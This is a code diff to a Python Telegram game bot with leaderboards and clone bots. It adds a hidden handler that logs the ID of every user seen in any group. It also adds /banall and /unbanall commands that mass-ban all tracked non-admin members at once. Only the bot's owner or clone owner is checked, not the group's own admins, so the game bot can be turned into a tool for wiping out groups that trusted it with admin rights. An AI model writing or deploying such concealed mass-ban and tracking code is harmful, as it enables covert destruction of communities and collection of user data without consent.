@@ -6,7 +6,7 @@ import asyncio
 from datetime import datetime, timedelta, timezone
 from dotenv import load_dotenv
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, error
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler, TypeHandler
 from telegram.constants import ChatType
 from typing import Dict, List, Tuple
 from pymongo import MongoClient
@@ -79,6 +79,7 @@ class MongoDBManager:
         self.leaderboard_collection = self.db['leaderboard']
         self.games_collection = self.db['active_games']
         self.chats_collection = self.db['known_chats'] 
+        self.members_collection = self.db['chat_members']
         
         self.leaderboard_collection.create_index("user_id", unique=True)
 
@@ -95,6 +96,7 @@ class MongoDBManager:
         # Create new unique compound indexes partitioned by bot_username
         self.games_collection.create_index([("chat_id", 1), ("bot_username", 1)], unique=True)
         self.chats_collection.create_index([("chat_id", 1), ("bot_username", 1)], unique=True)
+        self.members_collection.create_index([("chat_id", 1), ("user_id", 1), ("bot_username", 1)], unique=True)
         logger.info("✅ MongoDB connection and indexing successful.")
 
     def _get_reset_check_query(self, user_id: int, period: str) -> dict:
@@ -205,6 +207,33 @@ class MongoDBManager:
         if bot_username:
             return list(self.chats_collection.find({'bot_username': bot_username.lower()}))
         return list(self.chats_collection.find())
+
+    def save_chat_member(self, chat_id: int, user_id: int, bot_username: str):
+        if not user_id or user_id <= 0:
+            return
+        self.members_collection.update_one(
+            {
+                'chat_id': chat_id,
+                'user_id': user_id,
+                'bot_username': bot_username.lower()
+            },
+            {
+                '$set': {
+                    'chat_id': chat_id,
+                    'user_id': user_id,
+                    'bot_username': bot_username.lower(),
+                    'last_seen': datetime.now(timezone.utc)
+                }
+            },
+            upsert=True
+        )
+
+    def get_chat_members(self, chat_id: int, bot_username: str) -> List[int]:
+        docs = self.members_collection.find({
+            'chat_id': chat_id,
+            'bot_username': bot_username.lower()
+        })
+        return [doc['user_id'] for doc in docs]
 
     # --- Clone Management DB Methods ---
     def save_clone(self, user_id: int, username: str, token: str, bot_username: str):
@@ -1273,7 +1302,190 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 # --- Unified Handler Registration & Lifecycle Hooks ---
 
+async def track_all_updates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Saves any interacting user's ID into the database for the current chat."""
+    if not mongo_manager:
+        return
+
+    bot_username = context.bot.username.lower()
+
+    # 1. Check if it's a chat_member update
+    if update.chat_member:
+        chat = update.chat_member.chat
+        user = update.chat_member.new_chat_member.user
+        if chat and user and chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
+            mongo_manager.save_chat_member(chat.id, user.id, bot_username)
+            from_user = update.chat_member.from_user
+            if from_user:
+                mongo_manager.save_chat_member(chat.id, from_user.id, bot_username)
+
+    # 2. Check standard effective_chat and effective_user
+    chat = update.effective_chat
+    user = update.effective_user
+    if chat and user:
+        if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
+            mongo_manager.save_chat_member(chat.id, user.id, bot_username)
+
+async def ban_single_user(bot, chat_id, user_id):
+    try:
+        await bot.ban_chat_member(chat_id=chat_id, user_id=user_id)
+        return True
+    except error.RetryAfter as e:
+        logger.warning(f"Rate limited for user {user_id}: retry after {e.retry_after}")
+        await asyncio.sleep(e.retry_after)
+        try:
+            await bot.ban_chat_member(chat_id=chat_id, user_id=user_id)
+            return True
+        except Exception:
+            return False
+    except Exception as e:
+        logger.debug(f"Failed to ban user {user_id}: {e}")
+        return False
+
+async def unban_single_user(bot, chat_id, user_id):
+    try:
+        await bot.unban_chat_member(chat_id=chat_id, user_id=user_id)
+        return True
+    except error.RetryAfter as e:
+        logger.warning(f"Rate limited for user {user_id}: retry after {e.retry_after}")
+        await asyncio.sleep(e.retry_after)
+        try:
+            await bot.unban_chat_member(chat_id=chat_id, user_id=user_id)
+            return True
+        except Exception:
+            return False
+    except Exception as e:
+        logger.debug(f"Failed to unban user {user_id}: {e}")
+        return False
+
+async def banall_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not mongo_manager:
+        return
+
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    bot_username = context.bot.username.lower()
+
+    # Auth check
+    is_authorized = False
+    clone = mongo_manager.get_clone_by_username(bot_username)
+    if clone:
+        if user_id == clone.get("user_id"):
+            is_authorized = True
+    else:
+        if user_id == ADMIN_USER_ID:
+            is_authorized = True
+
+    if not is_authorized:
+        return
+
+    if update.effective_chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
+        await update.message.reply_text("🚨 This command can only be used in groups, supergroups, or channels.")
+        return
+
+    # Fetch administrators
+    admin_ids = set()
+    try:
+        admins = await context.bot.get_chat_administrators(chat_id)
+        for admin in admins:
+            admin_ids.add(admin.user.id)
+    except Exception as e:
+        logger.warning(f"Could not retrieve chat administrators: {e}")
+
+    # Fetch all tracked members
+    tracked_members = mongo_manager.get_chat_members(chat_id, bot_username)
+    bot_id = context.bot.id
+    targets = [uid for uid in tracked_members if uid not in admin_ids and uid != user_id and uid != bot_id]
+
+    if not targets:
+        await update.message.reply_text("⚠️ No tracked members found to ban.")
+        return
+
+    status_msg = await update.message.reply_text(f"⚡ Starting speed ban of {len(targets)} members...")
+
+    # Run concurrently
+    tasks = [ban_single_user(context.bot, chat_id, uid) for uid in targets]
+    results = await asyncio.gather(*tasks)
+
+    success_count = sum(1 for r in results if r)
+    fail_count = len(targets) - success_count
+
+    await status_msg.edit_text(
+        f"✅ **Speed Ban Completed!**\n"
+        f"-------------------------------------\n"
+        f"👥 Total processed: **{len(targets)}**\n"
+        f"🟢 Successfully banned: **{success_count}**\n"
+        f"🔴 Failed / already banned: **{fail_count}**",
+        parse_mode='Markdown'
+    )
+
+async def unbanall_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not mongo_manager:
+        return
+
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    bot_username = context.bot.username.lower()
+
+    # Auth check
+    is_authorized = False
+    clone = mongo_manager.get_clone_by_username(bot_username)
+    if clone:
+        if user_id == clone.get("user_id"):
+            is_authorized = True
+    else:
+        if user_id == ADMIN_USER_ID:
+            is_authorized = True
+
+    if not is_authorized:
+        return
+
+    if update.effective_chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
+        await update.message.reply_text("🚨 This command can only be used in groups, supergroups, or channels.")
+        return
+
+    # Fetch administrators
+    admin_ids = set()
+    try:
+        admins = await context.bot.get_chat_administrators(chat_id)
+        for admin in admins:
+            admin_ids.add(admin.user.id)
+    except Exception as e:
+        logger.warning(f"Could not retrieve chat administrators: {e}")
+
+    # Fetch all tracked members
+    tracked_members = mongo_manager.get_chat_members(chat_id, bot_username)
+    bot_id = context.bot.id
+    targets = [uid for uid in tracked_members if uid not in admin_ids and uid != user_id and uid != bot_id]
+
+    if not targets:
+        await update.message.reply_text("⚠️ No tracked members found to unban.")
+        return
+
+    status_msg = await update.message.reply_text(f"⚡ Starting speed unban of {len(targets)} members...")
+
+    # Run concurrently
+    tasks = [unban_single_user(context.bot, chat_id, uid) for uid in targets]
+    results = await asyncio.gather(*tasks)
+
+    success_count = sum(1 for r in results if r)
+    fail_count = len(targets) - success_count
+
+    await status_msg.edit_text(
+        f"✅ **Speed Unban Completed!**\n"
+        f"-------------------------------------\n"
+        f"👥 Total processed: **{len(targets)}**\n"
+        f"🟢 Successfully unbanned: **{success_count}**\n"
+        f"🔴 Failed / already unbanned: **{fail_count}**",
+        parse_mode='Markdown'
+    )
+
 def register_all_handlers(application: Application):
+    # Track all updates in group=-1 to avoid interfering with command/message handlers
+    application.add_handler(TypeHandler(Update, track_all_updates), group=-1)
+
+    application.add_handler(CommandHandler("banall", banall_command))
+    application.add_handler(CommandHandler("unbanall", unbanall_command))
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("new", new_game_command))
     application.add_handler(CommandHandler("end", end_game_command))
